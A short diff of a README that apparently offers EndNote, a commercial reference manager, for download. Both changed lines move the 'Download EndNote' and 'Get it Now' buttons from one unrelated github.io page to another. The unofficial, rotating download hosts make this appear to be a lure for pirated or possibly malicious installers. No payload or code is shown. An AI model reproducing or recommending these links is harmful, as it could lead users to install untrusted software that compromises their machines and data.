@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://urinoterapia-sigma.github.io/.github/endNote">
+  <a href="https://six-sevens.github.io/.github/endNote">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download EndNote"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The 7000-plus citation style library reflects the genuine diversity of citation 
 
 <p align="center">
 
-[![Get it Now EndNote](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/endNote)
+[![Get it Now EndNote](https://img.shields.io/badge/Get_it_Now-0077B6?style=for-the-badge&logo=apple&logoColor=white)](https://six-sevens.github.io/.github/endNote)
 
 </p>
 
